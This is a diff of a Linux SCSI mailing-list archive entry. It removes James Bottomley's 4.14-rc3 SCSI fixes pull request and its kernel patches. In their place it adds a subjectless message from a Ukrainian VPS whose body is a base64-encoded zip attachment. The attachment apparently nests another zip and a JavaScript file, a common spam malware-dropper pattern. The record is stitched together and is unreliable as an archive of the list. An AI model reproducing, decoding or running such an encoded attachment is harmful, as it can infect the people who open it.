@@ -1,249 +1,145 @@
-From: James Bottomley <James.Bottomley@HansenPartnership.com>
-Subject: [GIT PULL] SCSI fixes for 4.14-rc3
-Date: Sat, 07 Oct 2017 09:21:02 -0700
-Message-ID: <1507393262.3080.4.camel@HansenPartnership.com>
+From: <nelcastellodicarta@gmail.com>
+Subject: (unknown)
+Date: Sun, 08 Oct 2017 11:08:36 -0000
+Message-ID: <150746091652.32756.1680683409355234032@vps-15227.vps-ukraine.com.ua>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: 8bit
+Content-Type: application/zip; name="354549.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-scsi-owner@vger.kernel.org>
-Received: from bedivere.hansenpartnership.com ([66.63.167.143]:35282 "EHLO
-        bedivere.hansenpartnership.com" rhost-flags-OK-OK-OK-OK)
-        by vger.kernel.org with ESMTP id S1751258AbdJGQVU (ORCPT
-        <rfc822;linux-scsi@vger.kernel.org>); Sat, 7 Oct 2017 12:21:20 -0400
+Received: from vps-15227.vps-ukraine.com.ua ([185.65.245.143]:49670 "HELO
+        vps-15227.vps-ukraine.com.ua" rhost-flags-OK-OK-OK-OK)
+        by vger.kernel.org with SMTP id S1751651AbdJHLIi (ORCPT
+        <rfc822;linux-scsi@vger.kernel.org>); Sun, 8 Oct 2017 07:08:38 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
-To: Andrew Morton <akpm@linux-foundation.org>, Linus Torvalds <torvalds@linux-foundation.org>
-Cc: linux-scsi <linux-scsi@vger.kernel.org>, linux-kernel <linux-kernel@vger.kernel.org>
+To: linux-scsi@vger.kernel.org
 
-A couple of serious fixes (use after free and blacklist for WRITE
-SAME).  One error leg fix (write_pending failure) and one user
-experience problem (do not override max_sectors_kb) and one minor
-unused function removal (iscsi_destroy_session).
-
-The patch is available here:
-
-git://git.kernel.org/pub/scm/linux/kernel/git/jejb/scsi.git scsi-fixes
-
-The short changelog is:
-
-Bryant G. Ly (1):
-      scsi: ibmvscsis: Fix write_pending failure path
-
-Khazhismel Kumykov (2):
-      scsi: libiscsi: Remove iscsi_destroy_session
-      scsi: libiscsi: Fix use-after-free race during iscsi_session_teardown
-
-Martin K. Petersen (2):
-      scsi: sd: Do not override max_sectors_kb sysfs setting
-      scsi: sd: Implement blacklist option for WRITE SAME w/ UNMAP
-
-And the diffstat:
-
- drivers/scsi/ibmvscsi_tgt/ibmvscsi_tgt.c |  2 +-
- drivers/scsi/libiscsi.c                  |  8 ++++----
- drivers/scsi/scsi_scan.c                 |  3 +++
- drivers/scsi/scsi_transport_iscsi.c      | 16 ---------------
- drivers/scsi/sd.c                        | 35 ++++++++++++++++++++++++--------
- include/scsi/scsi_device.h               |  1 +
- include/scsi/scsi_devinfo.h              |  1 +
- include/scsi/scsi_transport_iscsi.h      |  1 -
- 8 files changed, 36 insertions(+), 31 deletions(-)
-
-With full diff below.
-
-James
-
----
-
-diff --git a/drivers/scsi/ibmvscsi_tgt/ibmvscsi_tgt.c b/drivers/scsi/ibmvscsi_tgt/ibmvscsi_tgt.c
-index 785fb42f6650..2799a6b08f73 100644
---- a/drivers/scsi/ibmvscsi_tgt/ibmvscsi_tgt.c
-+++ b/drivers/scsi/ibmvscsi_tgt/ibmvscsi_tgt.c
-@@ -3767,7 +3767,7 @@ static int ibmvscsis_write_pending(struct se_cmd *se_cmd)
- 	 */
- 	if ((vscsi->flags & (CLIENT_FAILED | RESPONSE_Q_DOWN))) {
- 		pr_err("write_pending failed since: %d\n", vscsi->flags);
--		return 0;
-+		return -EIO;
- 	}
- 
- 	rc = srp_transfer_data(cmd, &vio_iu(iue)->srp.cmd, ibmvscsis_rdma,
-diff --git a/drivers/scsi/libiscsi.c b/drivers/scsi/libiscsi.c
-index bd4605a34f54..c62e8d111fd9 100644
---- a/drivers/scsi/libiscsi.c
-+++ b/drivers/scsi/libiscsi.c
-@@ -2851,9 +2851,6 @@ EXPORT_SYMBOL_GPL(iscsi_session_setup);
- /**
-  * iscsi_session_teardown - destroy session, host, and cls_session
-  * @cls_session: iscsi session
-- *
-- * The driver must have called iscsi_remove_session before
-- * calling this.
-  */
- void iscsi_session_teardown(struct iscsi_cls_session *cls_session)
- {
-@@ -2863,6 +2860,8 @@ void iscsi_session_teardown(struct iscsi_cls_session *cls_session)
- 
- 	iscsi_pool_free(&session->cmdpool);
- 
-+	iscsi_remove_session(cls_session);
-+
- 	kfree(session->password);
- 	kfree(session->password_in);
- 	kfree(session->username);
-@@ -2877,7 +2876,8 @@ void iscsi_session_teardown(struct iscsi_cls_session *cls_session)
- 	kfree(session->portal_type);
- 	kfree(session->discovery_parent_type);
- 
--	iscsi_destroy_session(cls_session);
-+	iscsi_free_session(cls_session);
-+
- 	iscsi_host_dec_session_cnt(shost);
- 	module_put(owner);
- }
-diff --git a/drivers/scsi/scsi_scan.c b/drivers/scsi/scsi_scan.c
-index e7818afeda2b..15590a063ad9 100644
---- a/drivers/scsi/scsi_scan.c
-+++ b/drivers/scsi/scsi_scan.c
-@@ -956,6 +956,9 @@ static int scsi_add_lun(struct scsi_device *sdev, unsigned char *inq_result,
- 	if (*bflags & BLIST_NO_DIF)
- 		sdev->no_dif = 1;
- 
-+	if (*bflags & BLIST_UNMAP_LIMIT_WS)
-+		sdev->unmap_limit_for_ws = 1;
-+
- 	sdev->eh_timeout = SCSI_DEFAULT_EH_TIMEOUT;
- 
- 	if (*bflags & BLIST_TRY_VPD_PAGES)
-diff --git a/drivers/scsi/scsi_transport_iscsi.c b/drivers/scsi/scsi_transport_iscsi.c
-index 0190aeff5f7f..7404d26895f5 100644
---- a/drivers/scsi/scsi_transport_iscsi.c
-+++ b/drivers/scsi/scsi_transport_iscsi.c
-@@ -2211,22 +2211,6 @@ void iscsi_free_session(struct iscsi_cls_session *session)
- EXPORT_SYMBOL_GPL(iscsi_free_session);
- 
- /**
-- * iscsi_destroy_session - destroy iscsi session
-- * @session: iscsi_session
-- *
-- * Can be called by a LLD or iscsi_transport. There must not be
-- * any running connections.
-- */
--int iscsi_destroy_session(struct iscsi_cls_session *session)
--{
--	iscsi_remove_session(session);
--	ISCSI_DBG_TRANS_SESSION(session, "Completing session destruction\n");
--	iscsi_free_session(session);
--	return 0;
--}
--EXPORT_SYMBOL_GPL(iscsi_destroy_session);
--
--/**
-  * iscsi_create_conn - create iscsi class connection
-  * @session: iscsi cls session
-  * @dd_size: private driver data size
-diff --git a/drivers/scsi/sd.c b/drivers/scsi/sd.c
-index fb9f8b5f4673..d175c5c5ccf8 100644
---- a/drivers/scsi/sd.c
-+++ b/drivers/scsi/sd.c
-@@ -715,13 +715,21 @@ static void sd_config_discard(struct scsi_disk *sdkp, unsigned int mode)
- 		break;
- 
- 	case SD_LBP_WS16:
--		max_blocks = min_not_zero(sdkp->max_ws_blocks,
--					  (u32)SD_MAX_WS16_BLOCKS);
-+		if (sdkp->device->unmap_limit_for_ws)
-+			max_blocks = sdkp->max_unmap_blocks;
-+		else
-+			max_blocks = sdkp->max_ws_blocks;
-+
-+		max_blocks = min_not_zero(max_blocks, (u32)SD_MAX_WS16_BLOCKS);
- 		break;
- 
- 	case SD_LBP_WS10:
--		max_blocks = min_not_zero(sdkp->max_ws_blocks,
--					  (u32)SD_MAX_WS10_BLOCKS);
-+		if (sdkp->device->unmap_limit_for_ws)
-+			max_blocks = sdkp->max_unmap_blocks;
-+		else
-+			max_blocks = sdkp->max_ws_blocks;
-+
-+		max_blocks = min_not_zero(max_blocks, (u32)SD_MAX_WS10_BLOCKS);
- 		break;
- 
- 	case SD_LBP_ZERO:
-@@ -3099,8 +3107,6 @@ static int sd_revalidate_disk(struct gendisk *disk)
- 		sd_read_security(sdkp, buffer);
- 	}
- 
--	sdkp->first_scan = 0;
--
- 	/*
- 	 * We now have all cache related info, determine how we deal
- 	 * with flush requests.
-@@ -3115,7 +3121,7 @@ static int sd_revalidate_disk(struct gendisk *disk)
- 	q->limits.max_dev_sectors = logical_to_sectors(sdp, dev_max);
- 
- 	/*
--	 * Use the device's preferred I/O size for reads and writes
-+	 * Determine the device's preferred I/O size for reads and writes
- 	 * unless the reported value is unreasonably small, large, or
- 	 * garbage.
- 	 */
-@@ -3129,8 +3135,19 @@ static int sd_revalidate_disk(struct gendisk *disk)
- 		rw_max = min_not_zero(logical_to_sectors(sdp, dev_max),
- 				      (sector_t)BLK_DEF_MAX_SECTORS);
- 
--	/* Combine with controller limits */
--	q->limits.max_sectors = min(rw_max, queue_max_hw_sectors(q));
-+	/* Do not exceed controller limit */
-+	rw_max = min(rw_max, queue_max_hw_sectors(q));
-+
-+	/*
-+	 * Only update max_sectors if previously unset or if the current value
-+	 * exceeds the capabilities of the hardware.
-+	 */
-+	if (sdkp->first_scan ||
-+	    q->limits.max_sectors > q->limits.max_dev_sectors ||
-+	    q->limits.max_sectors > q->limits.max_hw_sectors)
-+		q->limits.max_sectors = rw_max;
-+
-+	sdkp->first_scan = 0;
- 
- 	set_capacity(disk, logical_to_sectors(sdp, sdkp->capacity));
- 	sd_config_write_same(sdkp);
-diff --git a/include/scsi/scsi_device.h b/include/scsi/scsi_device.h
-index 82e93ee94708..67c5a9f223f7 100644
---- a/include/scsi/scsi_device.h
-+++ b/include/scsi/scsi_device.h
-@@ -192,6 +192,7 @@ struct scsi_device {
- 	unsigned no_dif:1;	/* T10 PI (DIF) should be disabled */
- 	unsigned broken_fua:1;		/* Don't set FUA bit */
- 	unsigned lun_in_cdb:1;		/* Store LUN bits in CDB[1] */
-+	unsigned unmap_limit_for_ws:1;	/* Use the UNMAP limit for WRITE SAME */
- 
- 	atomic_t disk_events_disable_depth; /* disable depth for disk events */
- 
-diff --git a/include/scsi/scsi_devinfo.h b/include/scsi/scsi_devinfo.h
-index 9592570e092a..36b03013d629 100644
---- a/include/scsi/scsi_devinfo.h
-+++ b/include/scsi/scsi_devinfo.h
-@@ -29,5 +29,6 @@
- #define BLIST_TRY_VPD_PAGES	0x10000000 /* Attempt to read VPD pages */
- #define BLIST_NO_RSOC		0x20000000 /* don't try to issue RSOC */
- #define BLIST_MAX_1024		0x40000000 /* maximum 1024 sector cdb length */
-+#define BLIST_UNMAP_LIMIT_WS	0x80000000 /* Use UNMAP limit for WRITE SAME */
- 
- #endif
-diff --git a/include/scsi/scsi_transport_iscsi.h b/include/scsi/scsi_transport_iscsi.h
-index 6183d20a01fb..b266d2a3bcb1 100644
---- a/include/scsi/scsi_transport_iscsi.h
-+++ b/include/scsi/scsi_transport_iscsi.h
-@@ -434,7 +434,6 @@ extern struct iscsi_cls_session *iscsi_create_session(struct Scsi_Host *shost,
- 						unsigned int target_id);
- extern void iscsi_remove_session(struct iscsi_cls_session *session);
- extern void iscsi_free_session(struct iscsi_cls_session *session);
--extern int iscsi_destroy_session(struct iscsi_cls_session *session);
- extern struct iscsi_cls_conn *iscsi_create_conn(struct iscsi_cls_session *sess,
- 						int dd_size, uint32_t cid);
- extern int iscsi_destroy_conn(struct iscsi_cls_conn *conn);
+UEsDBAoAAAAAADJXSEvcEUlxixsAAIsbAAAJAAAAMTEwMzcuemlwUEsDBBQAAAAIADFXSEuK+k/k
+9RoAAJ60AAAIAAAAMTEwMzcuanO9nVlXK0UQx989x+8Q8ZwItqK5ExHQ+9BZCQkXAmH1+EBWErKv
+BPW7O+Sq82+myv8MLi/3doaeme7q6qrq7TfffNMdHE1nl41OKT/OzPuPJ4vb9rrbrJ8Pi73bi/Ls
+JjM5yZc6jfX1fa/VP55dDWpnq2zz9Pz58bZRH03Xy0XVjufDyYdC8a60fLi5Pu0vbjONanZ2mXu6
+OC8PFsPJyfoom5+Pe/ZpObt8KLRLk2Lu6Oq+1jovlMcPw3b/MnvTOanUB4tyd5U/ehpfXjSH9+f9
+aqlxfTe7GSxOri/OK/XuOlN8yNrj5XNnPu1N+oXlpFlsl66PHxo369PzVnb+uDrKfRjY26fZdJh7
+Or6v1h9v70rZ62G5WbHzwfi81Ts56q9nq6OhnfbOTirXH3JPj+NGdjRbX5SP+8PauFudPZd69vw0
+0zy6rTyUr49bjZNCfVl8qN/dZ2rP3fnt8Xl/fHSSXc8qZ5PT6mNvuriatDLtemNc6d+tPgyPLzvF
+6Wn56uh6NCtV7aefLO+niUzjubDutUu5i359PGkm3ie2vxh2bsqr49NW7uEuSJ4FyZsg+RAkR0Hy
+KkjmgmRzGqRnQXIeJLvjdfCjFiQT7yE9bAU/VnA9SNog2ZDfs2yJtTmt94IfLfaU7SC5JdYMH9GH
+5O69KNZxJUiXGmJ15t3RB3jXTpD8wZFEIP0gXRHrkxVLfn4apKcZUd6lIHnSEgtbCJLrrtOEQXLY
+WmHDKc0VJJfQPthwQbIeJN/amNeuTML3TVFlxcftygoBBer3t5Tmg8dkxNd37qCEkwpI/HgBLfvc
+FEv8KDbEe2yUIMn7GopT7VfYKC28Q+5DFyjrEvSQGgheLG9xV9S/Uh8KNrtF65MfQDkzovLkZeXR
+2q8dpBdiIRuybo8gS0Lst3eixq/EkrbFrprNiD2lK0rtsT8AyYqi2YZawaObULzycZC+hacML0Ur
+lD8DwwKWbCQaAegIO6L0fhGvTltzsZGmYnslLuaQhalgZ7c9Fb3iwK1v2Cbcu28J5x01W7LoRYsB
+3V9rDmzeIH35rzSH7JF+g7TSURQnoHSPmdg9yqK2tkUr2FrXLs5E0T+LwlyKbfAhSNbO2hkoil2J
+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
+4nznShyo3t0rwNSBuFGRI6WW4iA4n4XSt6+DHwpS6m777pLRj3Li1p/nM3Gs9FDmcYsYpH6VSO38
+8MXO7mzc7863/agi/zTe3gId2NnZ7Y26w+2trZ0fEi9w3OfJdadSbi+u7s9vb+b9Iz8aai3v+34G
+8+knWy85/HneTXqVuT1v9DfJ0mB0uUlUj842/7//otOaX7R8DWvONhe+2Dx9k0xcHz+N+u3zyv3H
+e1ad0+ZFsee/aPNz2Pp4NZG7n7e2d3562Pxs21Vmk3h558vrqptfR2c/b/7f9ku/SVxfNKbd8XyT
+3r3ot1rj7dS3m1/ffruz+f9jNbuDs8l5o1296W0uZlfX69FL4Lf51frr5X/W9a+Xb/6DWlf9Evgv
+96X36SfddmJ7O3jwx2d+DdX9q6bvEynv+2/3v9n8u/Prr9uhPP59r570ctd3Xtrb8745+Pa773d2
+Er9sanIxzHceGqe3hemqtmzXn+/nifevEcc+d2qT9658dN/OXHTzpcXD6LJ39Wfjhp/xUp/2aJrY
+7hXKHx6Oaov7Sq4+yRaHff+eb39IhC//mDjL2e6y31lsmFTrm90XAOn8QchrzEvhp8v1mW1WVsN8
+vVo4rd0d+08efKiOWkMf55b1+9nNwu9Jrx76VfhpO76sUqnvv0+n/MSLaL4sVmZ/Gpb6bW1VuLv/
+5rt333nf7iXMHzn/bK3ZXbnXftzQEKfPzaXfb4t/jhnGndWT3XmR+ny6aO0kksnEdrjIn/lNeeA3
+yzvppe/2Dr7/bv/vbv3+W+/btHRr6ru05328NVTIcPZNMdv3/VlroxZ3mUXFH8eV8o1y4cgfi91c
+thPmfeLF2b6EU5l6dxPc9YRS7fiq8lFXRqXpwsdqd88zOftc7eQLjT+1RXj8i7p8883LbY1meW1v
+JqtC62p528tNZ/26fx/ytZGq/WaW9lzGEa9rMYaVyPx9K1U7SGocYHBtPcjSUEDMMx547N6P5dgL
+o6f7uYJb1Hy1O9LNzs5PQd6chx0knfGtOAvWdSHM4q1vZ2RDM5zGImPLYObVrKGxr3dFzrXWgC8e
+Fm7WONdB+noiDpTi8koxMPoHwo7CuYaHN+JQ4x0Jy7tqhgxBzLCs3QpGrKCXkK6J0fngtM7J2EHS
+6WCJCMBfzkUFPVDGflCqmIMoOojmFGyKYi4H6QgoZig+VOsMUcyixJbXL84PVF9lBCNpNR7nWpxN
+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
